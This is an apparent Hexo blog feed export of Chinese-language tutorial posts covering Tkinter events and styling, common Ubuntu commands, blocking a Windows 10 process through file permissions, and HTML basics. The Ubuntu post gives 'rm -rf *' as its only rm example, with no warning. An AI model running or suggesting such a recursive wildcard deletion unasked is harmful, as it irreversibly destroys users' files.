    messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">'欢迎来到C语言中文网'</span><span class="token punctuation">)</span>

<span class="token comment"># 使用grid()函数来布局，并控制按钮的显示位置</span>
tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> command<span class="token operator">=</span>login<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span><span class="token string">"w"</span><span class="token punctuation">,</span> padx<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> pady<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"退出"</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> command<span class="token operator">=</span>root<span class="token punctuation">.</span>quit<span class="token punctuation">)</span><span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">,</span> padx<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> pady<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token comment"># 开启事件主循环</span>
root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="处理用户输入和事件"><a href="#处理用户输入和事件" class="headerlink" title="处理用户输入和事件"></a>处理用户输入和事件</h1><h2 id="按钮点击"><a href="#按钮点击" class="headerlink" title="按钮点击"></a>按钮点击</h2><p>描述：处理按钮点击事件是最常见的用户交互操作之一。你可以定义一个回调函数，当按钮被点击时，这个函数会被调用执行相应的操作。</p>
<p>详细代码见上面的</p>
<h2 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h2><p>描述：Tkinter提供了几种鼠标事件，例如鼠标点击、鼠标移动等。你可以为组件绑定相应的事件处理函数，并根据需要执行操作。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

<span class="token keyword">def</span> <span class="token function">mouse_click</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Mouse clicked at:"</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>x<span class="token punctuation">,</span> event<span class="token punctuation">.</span>y<span class="token punctuation">)</span>

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个标签并为其绑定鼠标点击事件</span>
label <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Click me!"</span><span class="token punctuation">)</span>
label<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">"&lt;Button-1>"</span><span class="token punctuation">,</span> mouse_click<span class="token punctuation">)</span>
label<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h2><p>描述：你可以捕捉键盘事件，例如按键按下和释放等。通过为组件绑定键盘事件处理函数，你可以执行相应的操作。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk

<span class="token keyword">def</span> <span class="token function">key_pressed</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Key pressed:"</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>char<span class="token punctuation">)</span>

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个文本框并为其绑定键盘事件</span>
entry <span class="token operator">=</span> tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>window<span class="token punctuation">)</span>
entry<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">"&lt;Key>"</span><span class="token punctuation">,</span> key_pressed<span class="token punctuation">)</span>
entry<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="样式和主题"><a href="#样式和主题" class="headerlink" title="样式和主题"></a>样式和主题</h1><h2 id="样式选项："><a href="#样式选项：" class="headerlink" title="样式选项："></a>样式选项：</h2><ul>
<li><p>描述：每个Tkinter组件都有一些可用的样式选项，可以用于自定义组件的外观。你可以通过设置这些选项来改变字体、颜色、边框等属性。</p>
</li>
<li><p>grid() 函数的常用参数如下所示：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>column</td>
<td>控件位于表格中的第几列，窗体最左边的为起始列，默认为第 0 列</td>
</tr>
<tr>
<td>columnsapn</td>
<td>控件实例所跨的列数，默认为 1 列，通过该参数可以合并一行中多个领近单元格。</td>
</tr>
<tr>
<td>ipadx,ipady</td>
<td>用于控制内边距，在单元格内部，左右、上下方向上填充指定大小的空间。</td>
</tr>
<tr>
<td>padx,pady</td>
<td>用于控制外边距，在单元格外部，左右、上下方向上填充指定大小的空间。</td>
</tr>
<tr>
<td>row</td>
<td>控件位于表格中的第几行，窗体最上面为起始行，默认为第 0 行</td>
</tr>
<tr>
<td>rowspan</td>
<td>控件实例所跨的行数，默认为 1 行，通过该参数可以合并一列中多个领近单元格。</td>
</tr>
<tr>
<td>sticky</td>
<td>该属性用来设置控件位于单元格那个方位上，参数值和 anchor 相同，若不设置该参数则控件在单元格内居中</td>
</tr>
</tbody></table>
</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk
<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> ttk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个按钮</span>
button <span class="token operator">=</span> ttk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Button"</span><span class="token punctuation">)</span>

<span class="token comment"># 设置样式选项</span>
button<span class="token punctuation">.</span>config<span class="token punctuation">(</span>foreground<span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">,</span> background<span class="token operator">=</span><span class="token string">"lightgray"</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"Arial"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">"bold"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 显示按钮</span>
button<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>描述：Tkinter还提供了一些预定义的主题，可以快速改变整个应用程序的外观。你可以选择不同的主题，如<code>clam</code>、<code>alt</code>、<code>default</code>等。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk
<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> ttk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个标签</span>
label <span class="token operator">=</span> ttk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>

<span class="token comment"># 设置主题</span>
ttk<span class="token punctuation">.</span>Style<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>theme_use<span class="token punctuation">(</span><span class="token string">"clam"</span><span class="token punctuation">)</span>

<span class="token comment"># 显示标签</span>
label<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><p>描述：除了使用预定义的样式选项和主题外，你还可以创建自定义样式。这样可以更灵活地定义组件的外观和样式。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk
<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> ttk

window <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个按钮</span>
button <span class="token operator">=</span> ttk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>window<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Button"</span><span class="token punctuation">)</span>

<span class="token comment"># 创建一个自定义样式</span>
ttk<span class="token punctuation">.</span>Style<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>configure<span class="token punctuation">(</span><span class="token string">"CustomButton.TButton"</span><span class="token punctuation">,</span> foreground<span class="token operator">=</span><span class="token string">"blue"</span><span class="token punctuation">,</span> background<span class="token operator">=</span><span class="token string">"yellow"</span><span class="token punctuation">)</span>

<span class="token comment"># 应用自定义样式</span>
button<span class="token punctuation">.</span>config<span class="token punctuation">(</span>style<span class="token operator">=</span><span class="token string">"CustomButton.TButton"</span><span class="token punctuation">)</span>

<span class="token comment"># 显示按钮</span>
button<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>

window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="常见样式选项"><a href="#常见样式选项" class="headerlink" title="常见样式选项"></a>常见样式选项</h2><ol>
<li><p>通用样式选项：</p>
<ul>
<li><code>background</code>：背景颜色</li>
<li><code>foreground</code>：前景（文本）颜色</li>
<li><code>font</code>：字体（可以设置字体名称、大小和样式）</li>
<li><code>borderwidth</code>：边框宽度</li>
<li><code>relief</code>：边框样式（如<code>tk.SUNKEN</code>、<code>tk.RAISED</code>、<code>tk.FLAT</code>等）</li>
</ul>
</li>
<li><p>按钮样式选项：</p>
<ul>
<li><code>activebackground</code>：鼠标悬停时的背景颜色</li>
<li><code>activeforeground</code>：鼠标悬停时的前景颜色</li>
<li><code>disabledforeground</code>：禁用状态下的前景颜色</li>
<li><code>highlightbackground</code>：焦点框背景颜色</li>
<li><code>highlightcolor</code>：焦点框颜色</li>
</ul>
</li>
<li><p>标签样式选项：</p>
<ul>
<li><code>anchor</code>：文本对齐方式（如<code>tk.W</code>, <code>tk.E</code>, <code>tk.N</code>, <code>tk.S</code>, <code>tk.CENTER</code>等）</li>
<li><code>justify</code>：文本对齐方式（如<code>tk.LEFT</code>, <code>tk.RIGHT</code>, <code>tk.CENTER</code>等）</li>
<li><code>wraplength</code>：文本换行的宽度限制</li>
</ul>
</li>
<li><p>文本框样式选项：</p>
<ul>
<li><code>show</code>：用于替代显示实际文本内容的字符（用于密码输入框等）</li>
<li><code>width</code>：文本框的宽度（以字符数为单位）</li>
<li><code>height</code>：文本框的高度（以文本行数为单位）</li>
</ul>
</li>
</ol>
<p>这只是一小部分常见的样式选项示例。对于每个组件，可以通过查阅Tkinter的官方文档或其他资源来获取完整的样式选项列表和其详细说明。此外，你还可以创建自定义样式选项，以满足你的特定需求。</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu常见命令</title>
    <url>/2023/06/30/ubuntu%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h4 id="1-ls-list列出文件夹内容"><a href="#1-ls-list列出文件夹内容" class="headerlink" title="1. ls: list列出文件夹内容"></a>1. ls: list列出文件夹内容</h4><pre class="line-numbers language-none"><code class="language-none">ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> ls -l 查看文件大小、权限、修改时间等详细信息</p>
<h4 id="2-cd-更改目录"><a href="#2-cd-更改目录" class="headerlink" title="2. cd: 更改目录"></a>2. cd: 更改目录</h4><h4 id="3-cat"><a href="#3-cat" class="headerlink" title="3. cat"></a>3. cat</h4><pre class="line-numbers language-none"><code class="language-none">cat filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>读取文本文件内容, 显示在屏幕上</p>
<h4 id="4-less-读取大文本文件"><a href="#4-less-读取大文本文件" class="headerlink" title="4. less: 读取大文本文件"></a>4. less: 读取大文本文件</h4><p>当您使用 less 打开文件时，它会以页面形式打开文件。您可以向上&#x2F;向下滚动、查找文本等等。</p>
<p>读取完文件后，您可以<strong>按 Q 键退出 less 视图</strong>。您会注意到屏幕上没有显示任何内容。你的屏幕很干净。</p>
<h4 id="5-touch-创建新文件"><a href="#5-touch-创建新文件" class="headerlink" title="5. touch: 创建新文件"></a>5. touch: 创建新文件</h4><h4 id="6-mkdir-创建新文件夹"><a href="#6-mkdir-创建新文件夹" class="headerlink" title="6. mkdir: 创建新文件夹"></a>6. mkdir: 创建新文件夹</h4><h4 id="7-cp-copy"><a href="#7-cp-copy" class="headerlink" title="7. cp: copy"></a>7. cp: copy</h4><p>想象一下您必须修改配置文件。明智的做法是使用其他名称复制该文件。这样，您将获得该文件的备份。</p>
<pre class="line-numbers language-none"><code class="language-none">cp existing_file.txt existing_file.back<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>您也可以使用相同的 cp 命令来复制目录。为此，您必须指定递归选项<code>-r</code>：</p>
<pre class="line-numbers language-none"><code class="language-none">cp -r dir another_location<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="8-mv-move"><a href="#8-mv-move" class="headerlink" title="8. mv: move"></a>8. mv: move</h4><p>mv 命令代表“移动”。当您将文件复制到另一个位置时，它仍保留在原来的位置。</p>
<p>mv 命令将文件和文件夹移动到其他位置。您可以将其视为剪切粘贴操作。</p>
<pre class="line-numbers language-none"><code class="language-none">mv file.txt &#x2F;another&#x2F;location<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>您也可以使用 mv 命令重命名该文件。</p>
<pre class="line-numbers language-none"><code class="language-none">mv file.txt new_file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="9-rm-rmove删除文件和文件夹"><a href="#9-rm-rmove删除文件和文件夹" class="headerlink" title="9. rm: rmove删除文件和文件夹"></a>9. rm: rmove删除文件和文件夹</h4><pre class="line-numbers language-none"><code class="language-none">rm -rf *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="10-vim-用vim编辑器打开文件"><a href="#10-vim-用vim编辑器打开文件" class="headerlink" title="10. vim: 用vim编辑器打开文件"></a>10. vim: 用vim编辑器打开文件</h4><p>退出并保存时用<code>:wq</code></p>
<h4 id="11-clear-清除终端屏幕"><a href="#11-clear-清除终端屏幕" class="headerlink" title="11. clear: 清除终端屏幕"></a>11. clear: 清除终端屏幕</h4><h4 id="12-ps-process查看并处理进程"><a href="#12-ps-process查看并处理进程" class="headerlink" title="12. ps: process查看并处理进程"></a>12. ps: process查看并处理进程</h4><p>ps 命令用于处理系统上运行的进程。每个进程都有一个称为 PID 的关联 ID</p>
<pre class="line-numbers language-none"><code class="language-none">abhishek@itsfoss:~$ ps
    PID TTY          TIME CMD
  15358 ?        00:00:00 bash
  15404 ?        00:00:00 ps
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里，</p>
<p>PID：进程号<br>TTY：控制与进程相关的终端<br>TIME： CPU 总使用时间<br>CMD：运行进程的命令名称</p>
<p>要查看所有用户运行的所有进程，请使用：</p>
<pre class="line-numbers language-none"><code class="language-none">ps aux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="13-top-系统监视器"><a href="#13-top-系统监视器" class="headerlink" title="13. top: 系统监视器"></a>13. top: 系统监视器</h4><p>ps 命令为您提供所有正在运行的进程，而 top 命令为您提供进程和系统资源消耗的实时视图。</p>
<p>要停止正在运行的 top 命令，请使用<strong>Ctrl+C</strong>键盘快捷键。</p>
<h4 id="14-lsblk-列出磁盘和分区"><a href="#14-lsblk-列出磁盘和分区" class="headerlink" title="14. lsblk: 列出磁盘和分区"></a>14. lsblk: 列出磁盘和分区</h4><pre class="line-numbers language-none"><code class="language-none">root@learnubuntu:~# lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
loop0     7:0    0 79.9M  1 loop &#x2F;snap&#x2F;lxd&#x2F;22923
loop1     7:1    0  103M  1 loop &#x2F;snap&#x2F;lxd&#x2F;23541
loop2     7:2    0 63.2M  1 loop &#x2F;snap&#x2F;core20&#x2F;1623
loop3     7:3    0   48M  1 loop &#x2F;snap&#x2F;snapd&#x2F;17336
loop4     7:4    0   48M  1 loop &#x2F;snap&#x2F;snapd&#x2F;17029
loop6     7:6    0 63.2M  1 loop &#x2F;snap&#x2F;core20&#x2F;1634
vda     252:0    0   25G  0 disk 
├─vda1  252:1    0 24.9G  0 part &#x2F;
├─vda14 252:14   0    4M  0 part 
└─vda15 252:15   0  106M  0 part &#x2F;boot&#x2F;efi
vdb     252:16   0  466K  1 disk 
root@learnubuntu:~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="15-fdisk-列出和管理磁盘和分区"><a href="#15-fdisk-列出和管理磁盘和分区" class="headerlink" title="15. fdisk: 列出和管理磁盘和分区"></a>15. fdisk: 列出和管理磁盘和分区</h4><p>另一个类似但更好的命令是<strong>fdisk</strong>命令。它允许您<strong>操作磁盘分区</strong>。这意味着您可以使用此命令创建新分区并删除现有分区并调整其大小。</p>
<h4 id="16-find-搜索文件"><a href="#16-find-搜索文件" class="headerlink" title="16. find:搜索文件"></a>16. find:搜索文件</h4><p>这是 find 命令的示例，它将为您提供所有以 . 当前目录中的<strong>txt扩展名。</strong></p>
<pre class="line-numbers language-none"><code class="language-none">find . -type f -name &quot;*.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="17-grep-在文件内容中搜索"><a href="#17-grep-在文件内容中搜索" class="headerlink" title="17. grep: 在文件内容中搜索"></a>17. grep: 在文件内容中搜索</h4><p>find 命令根据文件名和类型搜索文件。如果要根据文件内容进行搜索，可以使用 grep 命令。</p>
<pre class="line-numbers language-none"><code class="language-none">grep -r &quot;word&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>全局搜索word</p>
<h4 id="18-kill-终止进程"><a href="#18-kill-终止进程" class="headerlink" title="18. kill: 终止进程"></a>18. kill: 终止进程</h4><pre class="line-numbers language-none"><code class="language-none">sudo kill -9 process_ID_or_Name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>正如您在上面的命令中看到的，您需要知道进程 ID (PID) 或名称才能终止它。您可以使用 ps 或 top 命令来获取 PID 或确切的进程名称。</p>
<pre class="line-numbers language-none"><code class="language-none">ps aux | grep -i “name of your desired program”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>您注意到 grep 命令的使用了吗？您已经在使用此列表中提到的命令</p>
<h4 id="19-history命令历史记录"><a href="#19-history命令历史记录" class="headerlink" title="19: history命令历史记录"></a>19: history命令历史记录</h4><p>您可以选择使用其编号来运行历史记录中的条目，如下所示：</p>
<pre class="line-numbers language-none"><code class="language-none">!number<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>但即使历史记录也可能很大，所以再次使用 grep 命令来过滤您的搜索词。</p>
<pre class="line-numbers language-none"><code class="language-none">abhishek@itsfoss:~$ history | grep aux
 1915  ps aux
 1952  ps aux | grep -i spotify
 1955  ps -aux | grep -i calculator
 1957  ps -aux | grep -i calculator
 1959  ps -aux | grep -i calculator
 1970  history | grep aux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="20-chmod-change-mod更改文件权限"><a href="#20-chmod-change-mod更改文件权限" class="headerlink" title="20. chmod: change mod更改文件权限"></a>20. chmod: change mod更改文件权限</h4><p>例如，如果希望<strong>所有者拥有所有权限</strong>，而组和公共没有权限，则需要以绝对模式设置权限<strong>7</strong>00：(7&#x3D;1X+2W+4R)</p>
<pre class="line-numbers language-none"><code class="language-none">chmod 700 filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>****chmod****最常用的情况之一可能是为文件提供执行位。通常在下载可执行文件后，您需要在使用它之前添加此权限。授予所有者、组和其他所有人执行文件的权限：</p>
<pre class="line-numbers language-none"><code class="language-none">chmod +x &#x2F;path&#x2F;to&#x2F;file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="21-lshw：获取硬件详细信息"><a href="#21-lshw：获取硬件详细信息" class="headerlink" title="21. lshw：获取硬件详细信息"></a>21. lshw：获取硬件详细信息</h4><h4 id="22-sudo-i"><a href="#22-sudo-i" class="headerlink" title="22. sudo -i"></a>22. sudo -i</h4><h4 id="23-apt：安装、删除和管理-deb包"><a href="#23-apt：安装、删除和管理-deb包" class="headerlink" title="23. apt：安装、删除和管理.deb包"></a>23. apt：安装、删除和管理.deb包</h4><p>要安装包，请使用：</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt install package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>要删除已安装的软件，请使用：</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt remove package_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>要一次性使用所有可升级包更新您的 Ubuntu 系统：</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt update &amp;&amp; sudo apt upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="24-ip：查看IP地址等信息"><a href="#24-ip：查看IP地址等信息" class="headerlink" title="24. ip：查看IP地址等信息"></a>24. ip：查看IP地址等信息</h4><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="25-ping-检查远程系统是否可达"><a href="#25-ping-检查远程系统是否可达" class="headerlink" title="25. ping: 检查远程系统是否可达"></a>25. ping: 检查远程系统是否可达</h4><h4 id="26-ssh-连接到远程系统"><a href="#26-ssh-连接到远程系统" class="headerlink" title="26. ssh: 连接到远程系统"></a>26. ssh: 连接到远程系统</h4><pre class="line-numbers language-none"><code class="language-none">ssh user@ip_address_of_remote_system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="27-scp：在远程系统之间复制文件"><a href="#27-scp：在远程系统之间复制文件" class="headerlink" title="27. scp：在远程系统之间复制文件"></a>27. scp：在远程系统之间复制文件</h4><p>scp 命令的工作方式几乎与您之前看到的 cp 命令类似。</p>
<p>下面的示例将文件从远程系统上用户的主目录复制到本地登录系统的当前目录。</p>
<pre class="line-numbers language-none"><code class="language-none">scp username@ip_address:&#x2F;home&#x2F;username&#x2F;filename .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="28-exit-关闭终端"><a href="#28-exit-关闭终端" class="headerlink" title="28. exit: 关闭终端"></a>28. exit: 关闭终端</h4><h4 id="29-shutdown：关闭或重新启动系统"><a href="#29-shutdown：关闭或重新启动系统" class="headerlink" title="29.  shutdown：关闭或重新启动系统"></a>29.  shutdown：关闭或重新启动系统</h4>]]></content>
      <categories>
        <category>计算机知识</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>win10消除弹窗</title>
    <url>/2023/04/06/win10%E6%B6%88%E9%99%A4%E5%BC%B9%E7%AA%97/</url>
    <content><![CDATA[<p>需要管理员权限才能执行以下操作：</p>
<ol>
<li>打开任务管理器（快捷键Ctrl+Shift+Esc）。</li>
<li>在“进程”选项卡中找到要禁止启动的进程。</li>
<li>右键点击该进程，选择“打开文件位置”。</li>
<li>关闭任务管理器，找到刚才打开的文件位置。</li>
<li>右键点击该程序或文件，选择“属性”。</li>
<li>在“安全”选项卡中，选择当前用户。</li>
<li>在“权限”中，选中“拒绝”启动该进程。</li>
<li>确认保存更改。</li>
</ol>
<p>这样就可以长期禁止某个进程启动了。注意，如果想要启动该进程，需要解除该进程的启动禁止权限。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>前端基础</title>
    <url>/2023/06/26/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>
            这是一个标题.
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>
            段落
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>&lt;p style=&quot;color:red&quot;&gt;...&lt;/p&gt;</code></p>
<p><strong>body, head</strong>: </p>
<head>包含着页面的信息</head>,<body>内容会显示在页面中</body>

<p><strong>h1~h6</strong></p>
<h1>这是一级标题</h1>

<p><strong>ol,ul,li</strong></p>
<p>&#96;<ol><br>    <li>有序列表1</li><br>    <li>有序列表2</li></ol></p>
`

<p>&#96;<ul><br>    <li>无序列表1</li><br>    <li>无序列表2</li></ul></p>
`

<p><strong>链接,图片</strong></p>
<p><code>&lt;a href=&quot;https://buaa.lol&quot;&gt;点击打开我的博客&lt;/a&gt;</code></p>
<img data-src="https://7n.w3cschool.cn/statics/images/logonew2.png">

<p>image是单标签, 无需成对出现</p>
<p><strong>表格</strong></p>
<table>
    <tr>
        <th></th>
        <th>周六</th>
        <th>周日</th>
    </tr>
    <tr>
        <th>门票售出数量</th>
        <td>120</td>
        <td>32</td>
    </tr>
    <tr>
        <th>销售额</th>
        <td>1200</td>
        <td>320</td>
    </tr>
</table>

<p><strong>输入控件</strong></p>
<p>按钮, name输入控件的名称, 会与输入控件的内容一起提交到服务器 <input type="button" name="button" value="Button"></p>
<p>checkbox多选框 <input type="checkbox" name="checkbox"></p>
<p>radio: 单选框</p>
<p>password: 密码</p>
<p>submit: 提交</p>
<p>text: 普通文本输入</p>
<p>指定颜色 <input type="color" name="color"></p>
<p>输入日期 <input type="date" name="date"></p>
<p>输入日期和时间 <input type="datetime-local" name="datetime-local"></p>
<p>输入邮箱 <input type="email" name="email"></p>
